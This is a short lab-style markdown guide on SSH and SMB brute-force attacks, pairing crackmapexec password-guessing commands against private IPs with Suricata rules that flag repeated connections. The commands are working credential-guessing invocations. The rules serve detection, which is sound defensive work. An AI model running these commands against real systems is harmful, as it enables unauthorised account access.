# Brute Force Attack
Brute Force Attack is a type of attack where an attacker tries to guess the password of a user by trying all possible combinations of characters.

## SSH brute force
### Attack
```
crackmapexec ssh 10.10.10.1 -u TestUser -p pass.txt
```
![ssh brute force](./images/ssh-kali.png)

### Detection
#### Suricata
```
alert tcp any any -> $HOME_NET 22(
    msg:"Potential SSH Brute Force Attack";
    flow:to_server,established;
    threshold: type both, track by_src, count 10, seconds 60;
    sid:1000002;
    rev:1;
)
```
![Suricata Detection](./images/ssh-suricata.png)


## SMB brute force
### Attack
```
crackmapexec smb 10.10.10.5 -u insaen -p pass.txt
```

### Suricata
![smb brute force](./images/smb-kali.png)
```
alert tcp any any -> $HOME_NET 445(
    msg:"Potential SMB Brute Force Attack";
    flow:to_server,established;
    threshold: type both, track by_src, count 10, seconds 60;
    sid:1000003;
    rev:1;
)
```
![Suricata Detection](./images/smbSuricata.png)
